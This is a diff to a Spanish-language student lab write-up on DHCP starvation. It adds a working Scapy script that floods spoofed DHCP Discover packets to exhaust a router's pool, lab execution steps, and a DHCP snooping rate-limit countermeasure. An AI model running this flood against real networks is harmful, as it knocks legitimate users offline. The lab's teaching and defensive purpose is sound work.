@@ -40,8 +40,145 @@ Enviar masivamente solicitudes DHCP Discover con MACs falsas aleatorias para con
 6. Muestra el progreso cada 50 paquetes enviados
 
 ```bash
-sudo python3 dhcp_starvation.py <interfaz> [cantidad]
-sudo python3 dhcp_starvation.py eth0 300
+
+Crear y guardar el script:
+bash
+nano /home/kali-linux/dhcp_starvation.py
+
+Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X
+
+Dar permisos de ejecución:
+bash
+chmod +x /home/kali-linux/dhcp_starvation.py
+
+Pasos de ejecución
+Paso 1 — R1: Ver pool DHCP antes del ataque
+bash
+show ip dhcp pool
+show ip dhcp binding
+
+Paso 2 — Kali: Ejecutar el ataque
+bash
+sudo python3 /home/kali-linux/dhcp_starvation.py eth0 300
+
+Paso 3 — R1: Ver pool agotado
+bash
+show ip dhcp pool
+show ip dhcp binding
+
+Paso 4 — VPC1: Intentar obtener IP
+bash
+ip dhcp
+
+Debe fallar porque el pool está agotado ✅
+
+Paso 5 — SW1: Aplicar contramedida
+bash
+conf t
+ip dhcp snooping
+ip dhcp snooping vlan 10
+ip dhcp snooping vlan 20
+no ip dhcp snooping information option
+interface e0/0
+ ip dhcp snooping trust
+exit
+interface e0/3
+ ip dhcp snooping limit rate 15
+exit
+end
+write memory
+
+Paso 6 — R1: Limpiar bindings
+bash
+clear ip dhcp binding *
+
+Paso 7 — Kali: Ejecutar ataque de nuevo
+bash
+sudo python3 /home/kali-linux/dhcp_starvation.py eth0 300
+
+Paso 8 — SW1: Verificar bloqueo
+bash
+show ip dhcp snooping statistics
+
+Paso 9 — VPC1: Obtener IP correctamente
+bash
+ip dhcp
+show ip
+
+Gateway debe mostrar 10.13.32.1 ← R1 real ✅
+
+
+🐍 Script — dhcp_starvation.py
+python#!/usr/bin/env python3
+# =============================================================
+# Nombre:     Henry Vicente Quezada
+# Matricula:  2025-1332
+# Ataque:     DHCP Starvation - Pool Exhaustion
+# Fecha:      2026
+# =============================================================
+from scapy.all import *
+import random
+import time
+import sys
+
+def random_mac():
+    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(6)
+    )
+
+def dhcp_starvation(iface, count=500, delay=0.1):
+    print("=" * 55)
+    print("       ATAQUE DHCP STARVATION")
+    print("       Autor: Henry Vicente Quezada")
+    print("       Matricula: 2025-1332")
+    print("=" * 55)
+    print(f"[*] Interfaz : {iface}")
+    print(f"[*] Paquetes : {count}")
+    print(f"[*] Iniciando ataque...\n")
+
+    for i in range(count):
+        mac = random_mac()
+        mac_bytes = bytes.fromhex(mac.replace(":", ""))
+        pkt = (
+            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=mac_bytes + b'\x00' * 10,
+                  xid=random.randint(1, 0xFFFFFFFF)) /
+            DHCP(options=[("message-type","discover"),
+                ("hostname",f"host{random.randint(100,999)}"),"end"])
+        )
+        sendp(pkt, iface=iface, verbose=False)
+        if (i+1) % 50 == 0:
+            print(f"[+] Solicitudes enviadas: {i+1}/{count}")
+        time.sleep(delay)
+
+    print(f"\n[+] Completado. {count} solicitudes enviadas.")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("\nUso: sudo python3 dhcp_starvation.py <interfaz> [cantidad]")
+        sys.exit(1)
+    iface = sys.argv[1]
+    count = int(sys.argv[2]) if len(sys.argv) > 2 else 500
+    dhcp_starvation(iface, count)
+
+🛡️ Contramedida aplicada
+
+SW1(config)# ip dhcp snooping
+SW1(config)# ip dhcp snooping vlan 10
+SW1(config)# ip dhcp snooping vlan 20
+SW1(config)# no ip dhcp snooping information option
+SW1(config)# interface e0/0
+SW1(config-if)# ip dhcp snooping trust
+SW1(config)# interface e0/3
+SW1(config-if)# ip dhcp snooping limit rate 15
+SW1(config)# end
+SW1# write memory
+
+! Verificación
+SW1# show ip dhcp snooping statistics
+SW1# show ip dhcp snooping
 ```
 
 ---
@@ -105,25 +242,6 @@ sudo python3 dhcp_starvation.py eth0 300
 
 > 📷 `SW1# show ip dhcp snooping statistics` — bloqueando solicitudes excesivas
 
----
-
-## 6. Contramedidas
-
-```
-SW1(config)# ip dhcp snooping
-SW1(config)# ip dhcp snooping vlan 10
-SW1(config)# ip dhcp snooping vlan 20
-SW1(config)# no ip dhcp snooping information option
-SW1(config)# interface e0/0
-SW1(config-if)# ip dhcp snooping trust
-SW1(config)# interface e0/3
-SW1(config-if)# ip dhcp snooping limit rate 15
-SW1(config)# end
-SW1# write memory
-
-! Verificación
-SW1# show ip dhcp snooping statistics
-SW1# show ip dhcp snooping
 ```
 
 El rate limiting limita a 15 solicitudes DHCP por segundo en el puerto e0/3. Si Kali supera ese límite, el puerto se deshabilita automáticamente, impidiendo que el atacante agote el pool del servidor DHCP.
